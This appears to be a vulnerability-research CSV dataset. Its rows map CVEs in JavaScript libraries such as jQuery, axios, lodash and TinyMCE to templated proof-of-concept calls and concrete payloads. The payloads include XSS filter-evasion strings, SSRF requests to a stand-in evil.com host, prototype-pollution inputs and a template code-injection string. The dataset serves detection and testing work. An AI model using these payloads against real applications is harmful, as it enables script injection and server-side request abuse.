"cve","package_name","versions","url","source_db","source_url","vuln_type","cwe","sink_type","gadget","poc","payload","keywords","validated"
"NOCVE-SNYK-JS-AXIOS-9403194","axios","{(,0.30.0),[1.0.0,1.8.3)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-9403194","ssrf","CWE-918","function call",False,"{""LIBOBJ.create({baseURL: PAYLOAD1}).get(PAYLOAD2);""}","{""PAYLOAD1"": ""http://www.example.com"", ""PAYLOAD2"": ""http://www.evil.com""}",NULL,True
"CVE-2025-27152","axios","{(,0.30.0),[1.0.0,1.8.2)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-9292519","ssrf","CWE-918","function call",False,"{""LIBOBJ.create({baseURL: PAYLOAD1, allowAbsoluteUrls: false}}).get(PAYLOAD2);""}","{""PAYLOAD1"": ""http://www.example.com"", ""PAYLOAD2"": ""http://www.evil.com""}",NULL,True
"CVE-2020-7656","jquery","{(,1.9.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-569619","xss","CWE-79","file load",False,"{LIBOBJ(WILDCARD).load(PAYLOAD);}","{""PAYLOAD"": ""inject.html #inject"", ""FILE"": {""NAME"": ""inject.html"", ""CONTENT"": ""<div id=\""inject\""><script>alert(1);</script ></div>""}}",NULL,True
"CVE-2020-11023","jquery","{[1.5.1,3.5.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-565129","xss","CWE-79","function call",False,"{LIBOBJ.htmlPrefilter(PAYLOAD);}","{""PAYLOAD"": ""<style><style /><img src=x onerror=alert(1)>""}",NULL,True
"CVE-2020-11022","jquery","{[1.5.1,3.5.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-567880","xss","CWE-79","function call",False,"{LIBOBJ.htmlPrefilter(PAYLOAD);}","{""PAYLOAD"": ""<option><style></option></select><img src=x onerror=alert(1)></style>""}",NULL,True
"CVE-2024-39338","axios","{[1.3.2,1.7.4)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-7361793","ssrf","CWE-918","function call",False,"{LIBOBJ.create(WILDCARD).get(PAYLOAD);}","{""PAYLOAD"": ""//evil.com""}",NULL,True
"NOCVE-npm:angular:20171018","angular.js","{(,1.6.7)}","https://cdnjs.com/libraries/angular.js","cdnjs","https://security.snyk.io/vuln/npm:angular:20171018","xss","CWE-79","function call",False,"{$sanitize(PAYLOAD);}","{""PAYLOAD"": ""<a href=\""&#x3000;javascript:alert(1)\""></a>""}",NULL,True
"CVE-2015-1370","marked","{(,0.3.3)}","https://cdnjs.com/libraries/marked","cdnjs","https://security.snyk.io/vuln/npm:marked:20140131-2","xss","CWE-74","function call",False,"{LIBOBJ.parse(PAYLOAD);,LIBOBJ(PAYLOAD);}","{""PAYLOAD"": ""[XSS](vbscript:alert(1&#41;)""}",NULL,True
"CVE-2014-6071","jquery","{[1.4.2,1.6.2)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/npm:jquery:20140902","xss","CWE-79","function call",False,"{LIBOBJ(WILDCARD).after(LIBOBJ(PAYLOAD).text());}","{""PAYLOAD"": ""element[attribute='<div>&lt;script&gt;alert(1);&lt;/script&gt;</div>']""}",NULL,True
"CVE-2018-3721","lodash.js","{(,4.17.5)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/npm:lodash:20180130","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.merge(WILDCARD, WILDCARD);""}","{}",NULL,True
"CVE-2019-10744","lodash.js","{(,4.17.12)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-450202","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.defaultsDeep(WILDCARD, WILDCARD);""}","{}",NULL,True
"CVE-2021-23337","lodash.js","{(,4.17.21)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-1040724","ace","CWE-94","function call",False,"{""LIBOBJ.template(PAYLOAD1, { variable: PAYLOAD2 })();""}","{""PAYLOAD1"": """", ""PAYLOAD2"": ""){console.log(\""pwned\"")}; with(obj""}",NULL,True
"CVE-2020-28500","lodash.js","{(,4.17.21)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-1018905","redos","CWE-400","function call",False,"{LIBOBJ.trim(WILDCARD);,LIBOBJ.toNumber(WILDCARD);,LIBOBJ.trimEnd(WILDCARD);}","{}",NULL,True
"CVE-2019-1010266","lodash.js","{(,4.17.11)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-73639","redos","CWE-185","function call",False,"{LIBOBJ.words(WILDCARD);}","{}",NULL,True
"NOCVE-SNYK-JS-HANDSONTABLE-1019380","handsontable","{[0.23.0,8.2.0)}","https://cdnjs.com/libraries/handsontable","snyk","https://security.snyk.io/vuln/SNYK-JS-HANDSONTABLE-1019380","xss","CWE-79","function call",False,"{LIBOBJ.helper.stripTags(PAYLOAD);}","{""PAYLOAD"": ""<i<test>mg src onerror=alert(1)>test""}",NULL,True
"CVE-2021-23383","handlebars.js","{(,4.7.7)}","https://cdnjs.com/libraries/handlebars.js","snyk","https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029","xss","CWE-1321","function call",False,"{LIBOBJ.compile(PAYLOAD)(WILDCARD);}","{""PAYLOAD"": ""{{'a/.\"") || alert(\""1'}}""}",NULL,True
"NOCVE-npm:marked:20170815","marked","{(,0.3.9)}","https://cdnjs.com/libraries/marked","cdnjs","https://security.snyk.io/vuln/npm:marked:20170815","xss","CWE-79","function call",False,"{LIBOBJ.parse(PAYLOAD);,LIBOBJ(PAYLOAD);}","{""PAYLOAD"": ""[XSS](javascript&#X3a;alert%281%29)""}",NULL,True
"CVE-2015-8861","handlebars.js","{(,4.0.0)}","https://cdnjs.com/libraries/handlebars.js","snyk","https://security.snyk.io/vuln/npm:handlebars:20151207","xss","CWE-79","function call",False,"{""LIBOBJ.compile(WILDCARD)({ WILDCARD: PAYLOAD });""}","{""PAYLOAD"": "" onerror=alert(1)""}",NULL,True
"NOCVE-SNYK-JS-TINYMCE-1298037","tinymce","{(,5.7.1)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-1298037","improper sanitization","CWE-79","function call",False,"{LIBOBJ.setContent(PAYLOAD);,LIBOBJ.insertContent(PAYLOAD);,LIBOBJ.selection.setContent(PAYLOAD);,""LIBOBJ.execCommand('mceInsertContent', false, { content: PAYLOAD });""}","{""PAYLOAD"": ""<form action=\""javascript:alert(1)\""></form>""}",NULL,True
"NOCVE-npm:angular:20161101","angular.js","{[1.5.0,1.5.9)}","https://cdnjs.com/libraries/angular.js","cdnjs","https://security.snyk.io/vuln/npm:angular:20161101","csp bypass","CWE-284","function call",False,"{""bootstrap(WILDCARD, WILDCARD, WILDCARD);""}","{}",NULL,False
"CVE-2021-23436","immer","{[7.0.0,9.0.6)}","https://cdnjs.com/libraries/immer","snyk","https://security.snyk.io/vuln/SNYK-JS-IMMER-1540542","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.enablePatches(); LIBOBJ.applyPatches(WILDCARD, [ { op: 'add', path: [ [ PAYLOAD1 ], PAYLOAD2 ], value: PAYLOAD3 } ]);"",""LIBOBJ.enablePatches(); LIBOBJ.applyPatches(WILDCARD, [ { op: 'replace', path: [ [ PAYLOAD1 ], PAYLOAD2 ], value: PAYLOAD3 } ]);""}","{""PAYLOAD1"": ""__proto__"", ""PAYLOAD2"": ""foo"", ""PAYLOAD3"": ""bar""}",NULL,True
"CVE-2019-1010091","tinymce","{(,4.9.10),[5.0.0,5.2.2)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-568922","xss","CWE-79","function call",False,"{WILDCARD.selection.setContent(PAYLOAD);,""WILDCARD.getBody().innerHTML = PAYLOAD;""}","{""PAYLOAD"": ""<video controls=\""controls\"" width=\""300\"" height=\""150\""><source src=\""a\"" onerror=\""alert(1)\"" /></video>""}",NULL,True
"CVE-2020-12648","tinymce","{(,4.9.11),[5.0.0,5.4.0)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-598223","xss","CWE-79","function call",False,"{WILDCARD.setContent(PAYLOAD);,WILDCARD.insertContent(PAYLOAD);,WILDCARD.selection.setContent(PAYLOAD);,""WILDCARD.execCommand('mceInsertContent', WILDCARD, { content: PAYLOAD })"",""WILDCARD.getBody().innerHTML = PAYLOAD;""}","{""PAYLOAD"": ""<iframe><textarea></iframe><img src=\""\"" onerror=\""alert(1)\"">""}",NULL,True
"CVE-2024-38357","tinymce","{(,6.8.4),[7.0.0,7.2.0)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-7278053","xss","CWE-79","function call",False,"{WILDCARD.setContent(PAYLOAD);,WILDCARD.insertContent(PAYLOAD);,WILDCARD.selection.setContent(PAYLOAD);,""WILDCARD.execCommand('mceInsertContent', WILDCARD, { content: PAYLOAD })""}","{""PAYLOAD"": ""<noscript>&lt;/noscript&gt;&lt;style onload=alert(1)&gt;&lt;/style&gt;</noscript>""}",NULL,True
"NOCVE-npm:tinymce:20150610","tinymce","{(,4.9.6],[5.0.0,5.3.0)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/npm:tinymce:20150610","xss","CWE-79","function call",False,"{WILDCARD.selection.setContent(PAYLOAD);}","{""PAYLOAD"": ""<script>alert(1)</script>""}",NULL,True
"CVE-2022-23494","tinymce","{(,5.10.7),[6.0.0,6.3.1)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-3166281","xss","CWE-79","function call",False,"{""WILDCARD.windowManager.confirm(PAYLOAD, WILDCARD);"",""WILDCARD.windowManager.alert(PAYLOAD, WILDCARD);""}","{""PAYLOAD"": ""<a href=\""javascript:alert(1)\"">Click me!</a><script>alert(1)</script>""}",NULL,True
"CVE-2023-45819","tinymce","{(,5.10.8),[6.0.0,6.7.1)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-6016276","xss","CWE-79","function call",False,"{""WILDCARD.notificationManager.open({ text: PAYLOAD, type: WILDCARD });""}","{""PAYLOAD"": ""<img src=x onerror=alert(1)>""}",NULL,True
"NOCVE-npm:tinymce:20150813","tinymce","{(,4.2.4)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/npm:tinymce:20150813","xss","CWE-79","function call",False,"{WILDCARD.setContent(PAYLOAD);,WILDCARD.insertContent(PAYLOAD);,WILDCARD.selection.setContent(PAYLOAD);,""WILDCARD.execCommand('mceInsertContent', WILDCARD, { content: PAYLOAD })"",""WILDCARD.getBody().innerHTML = PAYLOAD;""}","{""PAYLOAD"": ""<p><html><audio><br /><audio src=x onerror=alert(1)></p>""}",NULL,True
"CVE-2023-45818","tinymce","{(,5.10.8),[6.0.0,6.7.1)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-6016290","xss","CWE-79","function call",False,"{WILDCARD.setContent(PAYLOAD);WILDCARD.undoManager.add();WILDCARD.undoManager.add();WILDCARD.undoManager.undo();,WILDCARD.insertContent(PAYLOAD);WILDCARD.undoManager.add();WILDCARD.undoManager.add();WILDCARD.undoManager.undo();,WILDCARD.selection.setContent(PAYLOAD);WILDCARD.undoManager.add();WILDCARD.undoManager.add();WILDCARD.undoManager.undo();,""WILDCARD.execCommand('mceInsertClipboardContent', WILDCARD, { content: PAYLOAD });WILDCARD.undoManager.add();WILDCARD.undoManager.add();WILDCARD.undoManager.undo();"",""WILDCARD.getBody().innerHTML = PAYLOAD;WILDCARD.undoManager.add();WILDCARD.undoManager.add();WILDCARD.undoManager.undo();"",""WILDCARD.setContent(PAYLOAD);WILDCARD.getBody().innerHTML = WILDCARD.getContent({ format: 'raw' });"",""WILDCARD.insertContent(PAYLOAD);WILDCARD.getBody().innerHTML = WILDCARD.getContent({ format: 'raw' });"",""WILDCARD.selection.setContent(PAYLOAD);WILDCARD.getBody().innerHTML = WILDCARD.getContent({ format: 'raw' });"",""WILDCARD.execCommand('mceInsertClipboardContent', WILDCARD, { content: PAYLOAD });WILDCARD.getBody().innerHTML = WILDCARD.getContent({ format: 'raw' });"",""WILDCARD.getBody().innerHTML = PAYLOAD;WILDCARD.getBody().innerHTML = WILDCARD.getContent({ format: 'raw' });""}","{""PAYLOAD"": ""<!--data-mce-selected=\""x\""><iframe onload=\""alert(1)\"">->""}",NULL,True
"CVE-2021-43138","async","{[2.0.0,2.6.4),[3.0.0,3.2.2)}","https://cdnjs.com/libraries/async","cdnjs","https://security.snyk.io/vuln/SNYK-JS-ASYNC-2441827","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.mapValues(WILDCARD, (val, key, cb) => cb(null, val), WILDCARD);""}","{}",NULL,True
"CVE-2019-11358","jquery","{(,3.4.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.extend(true, WILDCARD, WILDCARD);""}","{}",NULL,True
"CVE-2016-10707","jquery","{[3.0.0-rc1,3.0.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/npm:jquery:20160529","dos","CWE-400","function call",False,"{LIBOBJ(WILDCARD).attr(PAYLOAD);}","{""PAYLOAD"": ""requiRed""}",NULL,True
"NOCVE-SNYK-JS-AXIOS-6144788","axios","{[0.28.0,0.29.0),[1.0.0,1.6.4)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-6144788","prototype pollution","CWE-1321","function call",False,"{LIBOBJ.formToJSON(WILDCARD);}","{}",NULL,True
"NOCVE-SNYK-JS-AXIOS-6124857","axios","{(,0.29.0),[1.0.0,1.6.3)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-6124857","redos","CWE-1333","assignment",False,"{""LIBOBJ.defaults.baseURL = WILDCARD;
LIBOBJ.get(WILDCARD);""}","{}",NULL,True
"CVE-2015-9251","jquery","{(,1.12.0),[1.12.3,3.0.0-beta1)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/npm:jquery:20150627","xss","CWE-79","function call",False,"{LIBOBJ.ajax(PAYLOAD);}","{""PAYLOAD"": ""http://sakurity.com/jqueryxss""}",NULL,True
"CVE-2012-6708","jquery","{(,1.9.0)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/npm:jquery:20120206","xss","CWE-79","function call",False,"{LIBOBJ(WILDCARD).html(LIBOBJ(PAYLOAD).html());}","{""PAYLOAD"": ""element[attribute='<img src=\""x\"" onerror=\""alert(1)\"" />']""}",NULL,True
"CVE-2011-4969","jquery","{(,1.6.3)}","https://cdnjs.com/libraries/jquery","cdnjs","https://security.snyk.io/vuln/npm:jquery:20110606","xss","CWE-79","function call",False,"{LIBOBJ(location.hash);}","{""location.hash"": ""#<img src=/ onerror=alert(1)>""}",NULL,True
"CVE-2023-45857","axios","{[0.8.1,0.28.0),[1.0.0,1.6.0)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-6032459","csrf","CWE-352","function call",False,"{""LIBOBJ.create({withCredentials: true}).get(PAYLOAD);""}","{""PAYLOAD"": ""http://www.evil.com""}",NULL,False
"CVE-2021-3749","axios","{(,0.21.3)}","https://cdnjs.com/libraries/axios","cdnjs","https://security.snyk.io/vuln/SNYK-JS-AXIOS-1579269","redos","CWE-400","function call",False,"{trim(WILDCARD);}","{}",NULL,False
"CVE-2020-28496","three.js","{(,0.125.0)}","https://cdnjs.com/libraries/three.js","snyk","https://security.snyk.io/vuln/SNYK-JS-THREE-1064931","redos","CWE-400","function call",False,"{""new LIBOBJ.color(WILDCARD);""}","{}",NULL,True
"CVE-2016-10531","marked","{[0.3.1,0.3.6)}","https://cdnjs.com/libraries/marked","cdnjs","https://security.snyk.io/vuln/npm:marked:20150520","xss","CWE-79","function call",False,"{LIBOBJ.parse(PAYLOAD);,LIBOBJ(PAYLOAD);}","{""PAYLOAD"": ""[XSS](javascript&#58document;alert&#40;1&#41;)""}",NULL,True
